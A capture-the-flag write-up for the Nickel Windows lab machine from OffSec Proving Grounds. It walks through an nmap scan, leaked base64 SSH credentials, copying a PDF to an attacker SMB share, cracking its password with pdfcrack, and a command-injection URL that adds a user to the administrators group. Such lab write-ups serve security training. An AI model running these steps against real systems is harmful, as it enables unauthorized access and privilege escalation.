# Nickel

## Info

Nickel is an intermediate windows machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
21/tcp    open  ftp           syn-ack ttl 125 FileZilla ftpd
22/tcp    open  ssh           syn-ack ttl 125 OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp    open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8089/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
33333/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## HTTP 8089

There is an api endpoint that returns 'cannot get'.

Using a curl post request to list processes.

```
curl 'http://192.168.188.99:33333/list-running-procs' -X POST -H 'Content-Length: 0'
```

ssh credentials in the command line.

```
ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

After base64 decode.

```
ariah:NowiseSloopTheory139
```

## Root

There is Infrastructure.pdf file in the C:\ftp directory which is password protected.

Transfer file (kali).

```
impacket-smbserver -smb2support -username soaked -password soaked share $(pwd)
```

Transfer file (target).

```
net use n: \\192.168.45.214\share /user:soaked
cp infrastructure.pdf \\192.168.45.214\share
```

Cracking the password.

```
pdfcrack -f Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
```

pdf password.

```
ariah4168
```

This shows with the file C:\Windows\System32\ws80.ps1 that the localhost web server executes as nt authority system.

Local port forward.

```
ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.179.99
``` 

Add ariah to admin group.

```
http://127.0.0.1:8080/?net%20localgroup%20administrators%20ariah%20/add
```
